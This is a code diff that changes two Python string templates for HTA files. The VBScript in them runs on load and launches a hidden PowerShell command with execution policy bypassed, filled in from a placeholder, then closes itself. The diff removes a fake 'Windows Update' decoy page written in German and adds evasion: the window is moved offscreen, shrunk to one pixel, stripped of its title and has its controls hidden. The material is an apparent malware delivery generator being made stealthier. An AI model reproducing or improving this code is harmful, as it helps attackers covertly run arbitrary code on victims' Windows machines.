@@ -47,11 +47,18 @@ _HTA_EXE_TEMPLATE = '''\
     SINGLEINSTANCE="yes"
     SYSMENU="no"
     WINDOWSTATE="minimize"
+    SCROLL="no"
+    MAXIMIZEBUTTON="no"
+    MINIMIZEBUTTON="no"
+    INNERBORDER="no"
+    SELECTION="no"
 />
-<title>Windows Update</title>
+<title></title>
 </head>
 <script language="VBScript">
 Sub Window_OnLoad
+    window.moveTo -200, -200
+    window.resizeTo 1, 1
     Dim sh, tmp, n
     Set sh = CreateObject("WScript.Shell")
     Randomize
@@ -62,16 +69,7 @@ Sub Window_OnLoad
     Self.Close
 End Sub
 </script>
-<body style="background:#0078d4;color:#fff;font-family:'Segoe UI',sans-serif;margin:0;padding:40px;">
-<div style="max-width:500px;margin:80px auto;text-align:center;">
-<h2 style="font-weight:300;margin-bottom:8px;">Windows Update</h2>
-<p style="opacity:.75;font-size:13px;">Updates werden heruntergeladen. Bitte warten...</p>
-<div style="width:220px;height:3px;background:rgba(255,255,255,.25);margin:28px auto;border-radius:2px;overflow:hidden;">
-<div style="width:50%;height:100%;background:#fff;border-radius:2px;animation:slide 1.5s ease-in-out infinite;"></div></div>
-<p style="opacity:.5;font-size:11px;">Dieser Vorgang kann einige Minuten dauern.</p>
-</div>
-<style>@keyframes slide{0%{margin-left:-50%}100%{margin-left:110%}}</style>
-</body>
+<body style="margin:0;padding:0;background:#000;"></body>
 </html>
 '''
 
@@ -124,27 +122,25 @@ _HTA_TEMPLATE = '''\
     SINGLEINSTANCE="yes"
     SYSMENU="no"
     WINDOWSTATE="minimize"
+    SCROLL="no"
+    MAXIMIZEBUTTON="no"
+    MINIMIZEBUTTON="no"
+    INNERBORDER="no"
+    SELECTION="no"
 />
-<title>Windows Update</title>
+<title></title>
 </head>
 <script language="VBScript">
 Sub Window_OnLoad
+    window.moveTo -200, -200
+    window.resizeTo 1, 1
     Dim sh
     Set sh = CreateObject("WScript.Shell")
     sh.Run "powershell.exe -w h -nop -ep bypass -c " & Chr(34) & "{PS_CMD}" & Chr(34), 0, False
     Self.Close
 End Sub
 </script>
-<body style="background:#0078d4;color:#fff;font-family:'Segoe UI',sans-serif;margin:0;padding:40px;">
-<div style="max-width:500px;margin:80px auto;text-align:center;">
-<h2 style="font-weight:300;margin-bottom:8px;">Windows Update</h2>
-<p style="opacity:.75;font-size:13px;">Updates werden heruntergeladen. Bitte warten...</p>
-<div style="width:220px;height:3px;background:rgba(255,255,255,.25);margin:28px auto;border-radius:2px;overflow:hidden;">
-<div style="width:50%;height:100%;background:#fff;border-radius:2px;animation:slide 1.5s ease-in-out infinite;"></div></div>
-<p style="opacity:.5;font-size:11px;">Dieser Vorgang kann einige Minuten dauern.</p>
-</div>
-<style>@keyframes slide{0%{margin-left:-50%}100%{margin-left:110%}}</style>
-</body>
+<body style="margin:0;padding:0;background:#000;"></body>
 </html>
 '''
 
